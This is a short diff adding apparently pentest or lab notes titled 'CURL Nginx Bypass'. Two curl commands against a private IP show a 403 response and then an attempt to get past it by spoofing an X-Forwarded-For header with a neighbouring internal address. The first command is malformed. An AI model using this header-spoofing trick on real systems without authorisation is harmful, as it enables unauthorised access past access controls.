@@ -1,0 +1,6 @@
+# CURL Nginx Bypass
+
+# Gives you a 403 forbidden code
+curl -H http://10.194.0.68/.misc/
+# may be able to bypass the 403 code because of the x forwarded header
+curl -H 'X-forwarded-for:10.194.0.67' -I http://10.194.0.68/misc/   
